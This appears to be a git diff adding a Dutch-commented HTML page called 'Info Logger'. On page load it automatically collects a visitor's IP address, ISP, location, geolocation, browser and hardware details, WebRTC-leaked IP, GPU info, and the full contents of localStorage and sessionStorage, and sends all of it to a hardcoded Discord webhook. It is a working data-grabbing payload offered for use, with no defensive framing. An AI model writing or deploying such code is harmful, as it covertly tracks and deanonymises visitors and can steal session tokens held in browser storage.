@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Info Logger</title>
+    <script>
+        // 🚨 Vervang met je eigen Discord webhook URL!
+        const webhookURL = "https://discord.com/api/webhooks/1351915230162194505/1UuADVPH0L6Z7tZWe13pCuwuNyD0oCCTt94uFBJnYht9dWIgjaEXHQfw-N9M_EUmeBzi";
+
+        function getIP() {
+            fetch("https://api64.ipify.org?format=json")
+            .then(response => response.json())
+            .then(data => sendToDiscord("🌍 Extern IP: " + data.ip));
+
+            fetch("https://ipinfo.io/json")
+            .then(response => response.json())
+            .then(data => {
+                let ipInfo = `🌐 ISP: ${data.org}\n🌍 Locatie: ${data.city}, ${data.region}, ${data.country}`;
+                sendToDiscord(ipInfo);
+            });
+        }
+
+        function getSystemInfo() {
+            let info = {
+                "📌 Browser": navigator.userAgent,
+                "🖥️ Besturingssysteem": navigator.platform,
+                "💾 RAM": navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Onbekend",
+                "🖥️ CPU-kernen": navigator.hardwareConcurrency || "Onbekend",
+                "📏 Schermresolutie": window.screen.width + "x" + window.screen.height,
+                "🌍 Tijdzone": Intl.DateTimeFormat().resolvedOptions().timeZone,
+                "🔋 Batterijstatus": "Niet beschikbaar",
+                "🔌 Online status": navigator.onLine ? "✅ Online" : "❌ Offline",
+                "🔐 Cookies ingeschakeld": navigator.cookieEnabled ? "✅ Ja" : "❌ Nee",
+                "🕵️ Referrer": document.referrer || "Direct bezoek"
+            };
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(position => {
+                    info["📍 Geolocatie"] = `Lat: ${position.coords.latitude}, Lon: ${position.coords.longitude}`;
+                    sendToDiscord(JSON.stringify(info, null, 2));
+                }, () => {
+                    sendToDiscord(JSON.stringify(info, null, 2));
+                });
+            } else {
+                sendToDiscord(JSON.stringify(info, null, 2));
+            }
+
+            navigator.getBattery().then(battery => {
+                info["🔋 Batterijstatus"] = `${(battery.level * 100).toFixed(0)}% ${battery.charging ? "(🔌 Opladen)" : "(🔋 Niet aan het opladen)"}`;
+                sendToDiscord(JSON.stringify(info, null, 2));
+            });
+        }
+
+        function getWebRTCIP() {
+            let peerConnection = new RTCPeerConnection({ iceServers: [] });
+            peerConnection.createDataChannel("");
+            peerConnection.createOffer().then(offer => peerConnection.setLocalDescription(offer));
+
+            peerConnection.onicecandidate = event => {
+                if (event.candidate) {
+                    sendToDiscord("🌍 WebRTC IP: " + event.candidate.candidate);
+                }
+            };
+        }
+
+        function getLocalStorage() {
+            let localStorageData = {};
+            for (let i = 0; i < localStorage.length; i++) {
+                let key = localStorage.key(i);
+                localStorageData[key] = localStorage.getItem(key);
+            }
+            sendToDiscord("📦 Local Storage: " + JSON.stringify(localStorageData, null, 2));
+        }
+
+        function getSessionStorage() {
+            let sessionStorageData = {};
+            for (let i = 0; i < sessionStorage.length; i++) {
+                let key = sessionStorage.key(i);
+                sessionStorageData[key] = sessionStorage.getItem(key);
+            }
+            sendToDiscord("📦 Session Storage: " + JSON.stringify(sessionStorageData, null, 2));
+        }
+
+        function getGPUInfo() {
+            let canvas = document.createElement("canvas");
+            let gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+
+            if (gl) {
+                let debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
+                let vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+                let renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                sendToDiscord(`🎮 GPU Vendor: ${vendor}\n🖥️ Renderer: ${renderer}`);
+            }
+        }
+
+        function sendToDiscord(message) {
+            fetch(webhookURL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ content: "```" + message + "```" })
+            });
+        }
+
+        // 🚀 Automatisch alle info verzamelen en verzenden bij het laden van de pagina
+        window.onload = function() {
+            getIP();
+            getSystemInfo();
+            getWebRTCIP();
+            getLocalStorage();
+            getSessionStorage();
+            getGPUInfo();
+        };
+    </script>
+</head>
+<body>
+    <h2>📡 Informatie wordt verzameld...</h2>
+</body>
+</html>
